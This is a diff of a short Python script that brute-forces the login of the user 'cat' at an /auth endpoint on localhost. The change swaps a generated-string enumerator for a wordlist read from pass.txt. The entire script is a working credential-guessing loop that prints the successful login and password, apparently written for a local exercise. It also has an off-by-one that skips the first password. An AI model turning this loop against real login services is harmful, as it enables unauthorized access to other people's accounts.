@@ -3,6 +3,11 @@
 import requests
 
 state = 0
+
+with open('pass.txt') as passwords_file:
+	passwords = [password.strip() for password in passwords_file.readlines()]
+
+'''
 alphabet = '*0123456789qazxswedcvfrtgbnhyujmkiolp'
 
 def to_alph(n):
@@ -14,20 +19,21 @@ def to_alph(n):
 		n = n // base
 	clean_res = ''.join(c for c in res if c != '*')
 	return res
+'''
 
 def next_pass():
 	global state
 	
-	res = to_alph(state)
+	#res = to_alph(state)
 	state += 1 
-	return res
+	return passwords[state]
 
 login = 'cat'
 password = ''
 
 while True:
 	data = {'login': login, 'password': password}
-	response = requests.post('http://127.0.0.1:5000/auth', json=data)
+	response = requests.post('http://127.0.0.1:4000/auth', json=data)
 	if response.status_code == 200:
 		print("SUCCESS:", data)
 		break
